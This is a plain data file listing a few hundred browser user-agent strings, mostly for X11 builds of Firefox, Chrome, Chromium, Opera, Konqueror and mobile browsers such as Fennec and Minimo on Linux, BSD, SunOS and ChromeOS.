		Mozilla/5.0 (X11; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2) 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8 
		Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1 Iceweasel/14.0.1 
		Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20120724 Debian Iceweasel/15.02 
		Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu 
		Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2) 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1) 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330 
		Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1 
		Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10 
		Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12 
		Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1 
		Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0 
		Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox) 
		Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0 
		Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3 
		Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16 
		Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6 
		Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15 
		Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko) 
		Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko 
		Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30) 
		Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u) 
		Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/536.5 
		Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.4 (KHTML like Gecko) Chrome/22.0.1229.79 Safari/537.4 
		Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2 (KHTML, like Gecko) Safari/531.2 Epiphany/2.30.0 
		Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2 (KHTML, like Gecko) Safari/531.2 Epiphany/2.30.0 
		Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3 
		Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5 
		Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8 
		Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0 
		Mozilla/5.0 (compatible; Konqueror/4.5; NetBSD 5.0.2; X11; amd64; en_US) KHTML/4.5.4 (like Gecko) 
		Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15 
		Opera/9.80 (X11; FreeBSD 8.1-RELEASE i386; Edition Next) Presto/2.12.388 Version/12.10 
		Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8 
		Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1 
		Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020 
		Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025 
		Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9) 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/10.04 Chromium/15.0.874.106 Chrome/15.0.874.106 Safari/535.2 
		Mozilla/4.04 [en] (X11; I; SunOS 5.5 sun4u) 
		User-Agent: Mozilla/4.07 [ja_JP.EUC] (X11; I; MarkAgent FreeBSD 2.2.8-RELEASE i386; Nav) 
		User-Agent: Mozilla/4.07 [ja_JP.EUC] (X11; I; FreeBSD 2.2.8-RELEASE i386; Nav) 
		Mozilla/4.51 [ja] (X11; I; SunOS 5.8 sun4u) 
		Mozilla/4.76 [en_jp] (X11; U; SunOS 5.8 sun4u) 
		Mozilla/4.76 [ja] (X11; U; SunOS 5.8 sun4u) 
		Mozilla/4.78 [ja] (X11; U; SunOS 5.9 sun4u) 
		Mozilla/4.8 [ja] (X11; U; SunOS 5.7 sun4u) 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.2) Gecko/20040805 Netscape/7.2 
		Mozilla/5.0 (X11; U; SunOS sun4u; ja-JP; rv:1.0.1) Gecko/20020921 Netscape/7.0 
		Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:1.2.1) Gecko/20030225 
		Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:1.4.1) Gecko/20031030 
		Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.1) Gecko/20040805 
		Mozilla/5.0 (X11; U; SunOS sun4u; ja-JP; rv:1.4) Gecko/20040414 
		Mozilla/5.0 (X11; U; Linux i686; rv:1.7.3) Gecko/20040913 Firefox/0.10 
		Mozilla/5.0 (X11; U; Linux i686; rv:1.7.3) Gecko/20041001 Firefox/0.10.1 
		Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:1.6) Gecko/20040207 Firefox/0.8 
		Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.7) Gecko/20040708 Firefox/0.9 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20040803 Firefox/0.9.3 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20041013 Firefox/0.9.3 (Ubuntu) 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7) Gecko/20041013 Firefox/0.9.3 (Ubuntu) 
		Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.5) Gecko/20050103 Firefox/1.0 
		Mozilla/5.0 (X11; Linux x86_64; rv:2.0) Gecko/20110402 Firefox/4.0 Fennec/4.0b3 
		Mozilla/5.0 (X11; Linux i686; rv:2.0b7pre) Gecko/20101103 Firefox/4.0b8pre Fennec/4.0b2 
		Mozilla/5.0 (X11; Linux i686; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1 
		Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1 
		Mozilla/5.0 (X11; Linux i686; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0 
		Mozilla/5.0 (X11; Linux armv7l; rv:2.0b4pre) Gecko/20100818 Firefox/4.0b4pre Fennec/2.0a1pre 
		Mozilla/5.0 (X11; Linux armv7l; rv:2.0b4pre) Gecko/20100812 Firefox/4.0b4pre Fennec/2.0a1pre 
		Mozilla/5.0 (X11; Linux armv7l; rv:2.0b3pre) Gecko/20100730 Firefox/4.0b3pre Fennec/2.0a1pre 
		Mozilla/5.0 (X11; Linux armv71; en-US; rv:2.0b2pre) Gecko/20100722 Firefox/4.0b2pre Fennec/2.0a1pre 
		Mozilla/5.0 (X11; Linux armv71; rv:2.0b4pre) Gecko/20100818 Firefox/4.0b4pre Fennec/2.0a1pre 
		Mozilla/5.0 (X11; U; Linux armv7l; pl-PL; rv:1.9.2.5) Gecko/20100614 Firefox/3.6.5pre Fennec/1.1 
		Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2a1pre) Gecko/20090322 Fennec/1.0b2pre 
		Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.17) Gecko/20080829 Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2a1pre) Gecko/20090322 Fennec/1.0b2pre 
		Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b2pre) Gecko/20081116 Fennec/1.0a2pre 
		Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081116 Fennec/1.0a2pre 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b4pre) Gecko/20090401 Fennec/1.0a2 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b3pre) Gecko/20090106 Fennec/1.0a2 
		Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1 
		Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1 
		Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20081005220218 Gecko/2008052201 Fennec/0.9pre 
		Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20080923171103 Fennec/0.8 
		Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a2pre) Gecko/20080820121708 Fennec/0.7 
		Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a1pre) Gecko/2008071707 Fennec/0.5 
		Mozilla/5.0 (X11; U; Linux armv7l; ru-RU; rv:1.9.2.3pre) Gecko/20100723 Firefox/3.5 Maemo Browser 1.7.4.8 RX-51 N900 
		Mozilla/5.0 (X11; U; Linux armv7l; pt-PT; rv:1.9.2.3pre) Gecko/20100723 Firefox/3.5 Maemo Browser 1.7.4.8 RX-51 N900 
		Mozilla/5.0 (X11; U; Linux armv7l; no-NO; rv:1.9.2.3pre) Gecko/20100723 Firefox/3.5 Maemo Browser 1.7.4.8 RX-51 N900 
		Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.8) Gecko/20071018 Minimo/0.024 
		Mozilla/5.0 (X11; U; Linux armv6l; rv: 1.8.1.5pre) Gecko/20070619 Minimo/0.020 
		Mozilla/5.0 (X11; U; OpenBSD macppc; rv:1.8.1) Gecko/20070222 Minimo/0.016 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.11) Gecko/23.390; U; en) Presto/2.5.25 Version/10.54 
		Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000 
		Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36 
		Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1041.0 Safari/535.21 
		Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/11.10 Chromium/18.0.1025.142 Chrome/18.0.1025.142 Safari/535.19 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/10.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.56 Chrome/17.0.963.56 Safari/535.11 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11 
		Mozilla/5.0 (X11; CrOS i686 1193.158.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7 
		Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.04 Chromium/15.0.871.0 Chrome/15.0.871.0 Safari/535.2 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.824.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.814.0 Chrome/14.0.814.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.04 Chromium/14.0.813.0 Chrome/14.0.813.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.10 Chromium/14.0.808.0 Chrome/14.0.808.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.04 Chromium/14.0.808.0 Chrome/14.0.808.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.04 Chromium/14.0.804.0 Chrome/14.0.804.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.803.0 Chrome/14.0.803.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1 
		Mozilla/5.0 (X11; CrOS i686 13.587.48) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.43 Safari/535.1 
		Mozilla/5.0 ArchLinux (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/13.0.782.41 Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (X11; Linux amd64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1 
		Mozilla/5.0 (X11; CrOS i686 0.13.587) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.14 Safari/535.1 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36 
		Mozilla/5.0 (X11; Linux amd64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.35 (KHTML, like Gecko) Ubuntu/10.10 Chromium/13.0.764.0 Chrome/13.0.764.0 Safari/534.35 
		Mozilla/5.0 (X11; CrOS i686 0.13.507) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/13.0.763.0 Safari/534.35 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.33 (KHTML, like Gecko) Ubuntu/9.10 Chromium/13.0.752.0 Chrome/13.0.752.0 Safari/534.33 
		Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30 
		Mozilla/5.0 (X11; CrOS i686 12.0.742.91) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30 
		Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/12.0.742.91 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.91 Chromium/12.0.742.91 Safari/534.30 
		Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.60 Safari/534.30 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (X11; CrOS i686 12.433.216) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.105 Safari/534.30 
		Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30 
		Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Slackware/Chrome/12.0.742.100 Safari/534.30 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.702.0 Chrome/12.0.702.0 Safari/534.24 
		Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/11.0.696.50 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.14 Safari/534.24 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.04 Chromium/11.0.696.0 Chrome/11.0.696.0 Safari/534.24 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.23 (KHTML, like Gecko) Chrome/11.0.686.3 Safari/534.23 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.82 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux armv7l; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16 
		Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.127 Chrome/10.0.648.127 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.0 Chrome/10.0.648.0 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.0 Chrome/10.0.648.0 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.642.0 Chrome/10.0.642.0 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.634.0 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 SUSE/10.0.626.0 (KHTML, like Gecko) Chrome/10.0.626.0 Safari/534.16 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.612.3 Chrome/10.0.612.3 Safari/534.15 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.612.1 Safari/534.15 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.611.0 Chrome/10.0.611.0 Safari/534.15 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Ubuntu/10.10 Chromium/9.0.600.0 Chrome/9.0.600.0 Safari/534.14 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.84 Safari/534.13 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.44 Safari/534.13 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1333515017.9196 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04 Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/9.10 Chromium/9.0.592.0 Chrome/9.0.592.0 Safari/534.13 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.579.0 Safari/534.12 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.576.0 Safari/534.12 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/8.1.0.0 Safari/540.0 
		Mozilla/5.0 (X11; U; CrOS i686 0.9.130; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.344 Safari/534.10 
		Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.343 Safari/534.10 
		Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.341 Safari/534.10 
		Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.339 Safari/534.10 
		Mozilla/5.0 (X11; U; CrOS i686 0.9.128; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.339 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Ubuntu/10.10 Chromium/8.0.552.237 Chrome/8.0.552.237 Safari/534.10 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.200 Safari/534.10 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.551.0 Safari/534.10 
